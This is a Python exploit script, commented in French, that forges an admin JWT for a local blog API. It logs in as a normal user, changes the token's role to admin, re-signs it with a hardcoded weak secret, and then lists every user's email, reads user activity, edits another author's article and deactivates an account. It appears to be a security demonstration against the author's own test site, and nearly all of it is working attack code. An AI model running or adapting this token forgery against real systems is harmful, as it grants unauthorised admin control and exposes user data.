import requests
import json
import base64
import hmac
import hashlib

BASE_URL = "http://localhost:5000/api"
USERNAME = "lamyae"
PASSWORD = "lamyae1234"
JWT_SECRET = "your_super_secret_jwt_key_change_in_production_2024"

def b64_encode(data):
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(',', ':')).encode()
    ).decode().rstrip('=')

def b64_decode(data):
    data += '=' * (4 - len(data) % 4)
    return json.loads(base64.urlsafe_b64decode(data))

def forge_admin_token():
    r = requests.post(f"{BASE_URL}/auth/login",
        json={"username": USERNAME, "password": PASSWORD})
    token = r.json()["token"]
    parts = token.split(".")
    payload = b64_decode(parts[1])
    payload["role"] = "admin"
    new_payload_b64 = b64_encode(payload)
    msg = f"{parts[0]}.{new_payload_b64}".encode()
    sig = hmac.new(JWT_SECRET.encode(), msg, hashlib.sha256).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip('=')
    return f"{parts[0]}.{new_payload_b64}.{sig_b64}"

def test(label, method, url, token, body=None):
    headers = {"Authorization": f"Bearer {token}"}
    if method == "GET":
        r = requests.get(url, headers=headers)
    elif method == "PUT":
        r = requests.put(url, headers=headers, json=body)
    elif method == "DELETE":
        r = requests.delete(url, headers=headers)
    
    status = "✅" if r.status_code == 200 else "❌"
    print(f"\n{status} [{r.status_code}] {label}")
    if r.status_code == 200:
        data = r.json()
        # Afficher seulement les infos importantes
        if isinstance(data, list):
            print(f"   → {len(data)} élément(s) récupéré(s)")
            for item in data[:2]:  # Affiche les 2 premiers
                if 'username' in item:
                    print(f"   → User: {item.get('username')} | Email: {item.get('email')} | Rôle: {item.get('role')}")
                elif 'title' in item:
                    print(f"   → Article: {item.get('title')}")
        elif isinstance(data, dict):
            print(f"   → {json.dumps(data, indent=6)[:300]}")
    else:
        print(f"   → {r.text[:100]}")
    return r

def main():
    print("=" * 55)
    print("  EXPLORATION DU SITE AVEC TOKEN ADMIN FORGÉ")
    print("=" * 55)

    print("\n🔨 Forge du token admin...")
    admin_token = forge_admin_token()
    print(f"   Token forgé prêt ✅")

    print("\n" + "─" * 55)
    print("📊 1. STATISTIQUES DU SITE")
    print("─" * 55)
    test("Stats globales", "GET",
        f"{BASE_URL}/admin/stats", admin_token)

    print("\n" + "─" * 55)
    print("👥 2. LISTE DE TOUS LES UTILISATEURS")
    print("─" * 55)
    r = test("Tous les utilisateurs + emails",
        "GET", f"{BASE_URL}/admin/users", admin_token)
    
    # Récupérer l'ID du premier user pour les tests suivants
    user_id = None
    if r.status_code == 200 and r.json():
        users = r.json()
        for u in users:
            if u.get('role') == 'user':
                user_id = u.get('_id')
                break

    print("\n" + "─" * 55)
    print("🔍 3. ACTIVITÉ DÉTAILLÉE D'UN UTILISATEUR")
    print("─" * 55)
    if user_id:
        test(f"Activité de l'user {user_id[:8]}...",
            "GET", f"{BASE_URL}/admin/users/{user_id}/activity", admin_token)

    print("\n" + "─" * 55)
    print("📰 4. TOUS LES ARTICLES")
    print("─" * 55)
    r2 = test("Liste des articles", "GET",
        f"{BASE_URL}/articles", admin_token)

    article_id = None
    if r2.status_code == 200 and r2.json():
        article_id = r2.json()[0].get('_id')

    print("\n" + "─" * 55)
    print("✏️  5. MODIFIER UN ARTICLE (sans être l'auteur)")
    print("─" * 55)
    if article_id:
        test(f"Modification article {article_id[:8]}...",
            "PUT", f"{BASE_URL}/articles/{article_id}",
            admin_token,
            {"title": "Article modifié par l'attaquant !"})

    print("\n" + "─" * 55)
    print("🚫 6. DÉSACTIVER UN COMPTE UTILISATEUR")
    print("─" * 55)
    if user_id:
        test(f"Désactivation user {user_id[:8]}...",
            "PUT",
            f"{BASE_URL}/admin/users/{user_id}/deactivate",
            admin_token)

    print("\n" + "=" * 55)
    print("📋 RÉSUMÉ DE CE QU'UN ATTAQUANT PEUT FAIRE :")
    print("=" * 55)
    print("  ① Voir tous les utilisateurs et leurs emails")
    print("  ② Voir toute l'activité de chaque utilisateur")
    print("  ③ Modifier n'importe quel article du blog")
    print("  ④ Désactiver n'importe quel compte")
    print("  ⑤ Accéder aux statistiques confidentielles")
    print("\n  Tout ça avec un simple compte 'user' normal !")
    print("=" * 55)

if __name__ == "__main__":
    main()